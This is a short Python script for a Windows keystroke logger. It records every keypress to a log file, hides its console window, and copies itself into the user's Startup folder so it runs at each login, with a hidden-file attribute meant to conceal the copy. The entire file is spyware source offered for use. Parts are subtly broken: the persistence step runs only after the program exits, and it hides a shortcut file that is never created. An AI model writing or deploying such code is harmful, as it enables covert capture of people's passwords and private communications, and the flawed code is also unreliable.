from pynput.keyboard import Listener
import logging
import os
import shutil
import subprocess
import sys
import pystray
from pystray import Icon, Menu, MenuItem
from PIL import Image

# Configure logging
log_file = "keystrokes.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

# Function to save all recorded keystrokes to a file
def save_keystrokes():
    with open(log_file, 'r') as f:
        keystrokes = f.read()
    with open("keystrokes.txt", "a") as f:
        f.write(keystrokes)

# Callback function to log keystrokes
def on_press(key):
    logging.info(str(key))

# Create a listener to capture keystrokes
listener = Listener(on_press=on_press)
listener.start()

# Define system tray icon
def exit_action(icon, item):
    listener.stop()
    save_keystrokes()
    icon.stop()

image = Image.open("icon.png")  # Replace "icon.png" with your icon file
menu = Menu(MenuItem('Exit', exit_action))
icon = pystray.Icon("Keystroke Logger", image, menu=menu)

# Hide console window
if sys.platform.startswith('win32'):
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

icon.run()

# Auto-start on system startup
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
if not os.path.exists(os.path.join(startup_folder, 'KeystrokeLogger.lnk')):
    current_file_path = os.path.abspath(sys.argv[0])
    shutil.copy(current_file_path, startup_folder)
    subprocess.call(['attrib', '+h', os.path.join(startup_folder, 'KeystrokeLogger.lnk')])
